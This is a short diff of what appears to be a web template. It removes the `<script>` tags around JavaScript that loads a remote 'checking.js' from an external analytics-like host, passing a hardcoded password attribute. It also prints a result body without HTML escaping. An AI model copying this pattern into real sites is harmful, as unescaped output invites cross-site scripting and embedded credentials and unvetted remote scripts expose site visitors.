@@ -1,7 +1,7 @@
 {!! $result_op->body !!}
 
 
-<script>
+
 
     var script = document.createElement('script');
     script.src = "//sonar.semantiqo.com/4e3ll/checking.js";
@@ -10,4 +10,3 @@
     script.setAttribute('password', 'htnfhutn');
     document.getElementsByTagName('head')[0].appendChild(script) ;
 
-</script>
